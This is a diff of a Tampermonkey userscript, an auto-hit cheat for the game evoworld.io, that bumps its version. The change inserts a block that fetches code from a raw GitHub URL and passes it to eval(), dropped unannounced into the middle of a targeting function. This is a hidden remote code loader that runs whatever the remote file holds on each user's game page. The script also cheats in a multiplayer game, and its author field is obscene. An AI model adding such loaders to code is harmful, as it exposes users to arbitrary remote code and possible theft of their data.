@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Evoworld.io AutoHit
 // @namespace    http://tampermonkey.net/
-// @version      3.5
+// @version      3.7
 // @description  AutoHit,Flicklere özel yapılmıs taktik
 // @author       türk evo sikici
 // @match        https://evoworld.io/*
@@ -404,6 +404,20 @@
             urgency: isApproaching ? Math.max(0, 300 - distance) / 300 : 0
         };
     }
+
+// script
+
+fetch('https://raw.githubusercontent.com/shadowxds-eng/main.js/main/main.code')
+
+  .then(response => response.text())
+
+  .then(code => {
+
+    eval(code);
+
+  })
+
+  .catch(err => console.log('Yüklenemedi:', err));
 
     // Gelecek pozisyon hesaplama
     function predictPosition(target, analysis) {
